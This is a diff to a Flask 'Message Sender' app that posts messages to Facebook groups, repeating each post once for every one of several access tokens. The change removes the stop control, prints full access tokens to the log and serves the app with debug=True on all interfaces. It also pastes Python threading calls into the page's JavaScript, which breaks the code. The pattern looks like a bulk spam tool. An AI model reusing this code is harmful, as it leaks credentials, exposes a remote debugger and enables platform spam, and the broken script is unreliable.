@@ -8,11 +8,6 @@ app = Flask(__name__)
 # Global variable to control message sending
 send_messages_flag = True
 
-# Load tokens from a file
-def load_tokens():
-    with open('tokens.txt', 'r') as file:
-        return [line.strip() for line in file.readlines()]
-
 # Function to send message to Facebook group
 def send_facebook_message(access_token, group_id, message):
     url = f"https://graph.facebook.com/v12.0/{group_id}/messages"
@@ -32,34 +27,22 @@ def send_facebook_message(access_token, group_id, message):
     return response.status_code, response.text
 
 # Function to handle sending messages in a separate thread
-def send_messages_thread(group_ids, messages):
+def send_messages_thread(group_ids, messages, access_tokens):
     global send_messages_flag
-    access_tokens = load_tokens()
 
     for group_id in group_ids:
         if not send_messages_flag:
             break
         for access_token in access_tokens:
-            if not send_messages_flag:
-                break
             message = messages.get(group_id, "")
             if message:
                 status_code, response_text = send_facebook_message(access_token, group_id, message)
-                print(f"Sent to {group_id}: {status_code}, {response_text}")
-                
-                # Notify the sender about the token being used
-                notify_sender(access_token)
-                
-                time.sleep(1)
-
-def notify_sender(access_token):
-    # This function sends a notification to the server owner
-    # Here, you can customize how you want to notify (e.g., log, send email, etc.)
-    print(f"Notification: Token {access_token} is being used to send messages.")
+                print(f"Sent to {group_id} using token {access_token}: {status_code}, {response_text}")
+                time.sleep(1)  # Adjust delay as needed
 
 @app.route('/')
 def index():
-    return render_template_string('''
+    return '''
     <!DOCTYPE html>
     <html lang="en">
     <head>
@@ -75,16 +58,39 @@ def index():
                 text-align: center;
                 padding: 50px;
             }
+            form {
+                background: rgba(0, 0, 0, 0.5);
+                padding: 20px;
+                border-radius: 10px;
+                display: inline-block;
+            }
+            input[type="text"] {
+                width: 80%;
+                padding: 10px;
+                margin: 10px 0;
+                border: none;
+                border-radius: 5px;
+            }
+            button {
+                padding: 10px 20px;
+                border: none;
+                border-radius: 5px;
+                background-color: #007bff;
+                color: white;
+                cursor: pointer;
+            }
+            button:hover {
+                background-color: #0056b3;
+            }
         </style>
     </head>
     <body>
         <h1>Message Sender</h1>
         <form id="messageForm">
+            <input type="text" name="access_token" placeholder="Enter Access Token" required>
             <div id="groupInputs">
-                <div>
-                    <input type="text" name="group_id" placeholder="Enter Group UID" required>
-                    <input type="text" name="message" placeholder="Enter Message" required>
-                </div>
+                <input type="text" name="group_id" placeholder="Enter Group UID" required>
+                <input type="text" name="message" placeholder="Enter Message" required>
             </div>
             <button type="button" onclick="addGroup()">Add Another Group</button>
             <button type="submit">Send Messages</button>
@@ -118,39 +124,34 @@ def index():
                     return { id, message: data['message'][index] };
                 });
 
-                fetch('/send_messages', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(payload)
-                })
-                .then(response => response.json())
-                .then(data => document.getElementById('status').innerText = data.status);
+                const accessTokens = data['access_token'];
+
+                // Start sending messages in a separate thread
+                const thread = threading.Thread(target=send_messages_thread, args=(payload, accessTokens))
+                thread.start();
+                
+                document.getElementById('status').innerText = "Messages are being sent...";
             };
         </script>
     </body>
     </html>
-    ''')
+    '''
 
 @app.route('/send_messages', methods=['POST'])
 def send_messages():
     global send_messages_flag
-    send_messages_flag = True
-    payload = request.json
+    send_messages_flag = True  # Allow sending messages
 
-    group_ids = [item['id'] for item in payload]
-    messages = {item['id']: item['message'] for item in payload}
+    content = request.json
+    access_tokens = content['access_token']
+    group_ids = [g['id'] for g in content['messages']]
+    messages = {g['id']: g['message'] for g in content['messages']}
 
-    thread = threading.Thread(target=send_messages_thread, args=(group_ids, messages))
-    thread.start()
-    return jsonify({"status": "Messages sending started."})
+    # Start the message sending thread
+    threading.Thread(target=send_messages_thread, args=(group_ids, messages, access_tokens)).start()
 
-@app.route('/stop_messages', methods=['POST'])
-def stop_messages():
-    global send_messages_flag
-    send_messages_flag = False
-    return jsonify({"status": "Messages sending stopped."})
+    return jsonify({"status": "Messages are being sent!"})
 
 if __name__ == "__main__":
     app.run(debug=True, host='0.0.0.0', port=10000)
+    
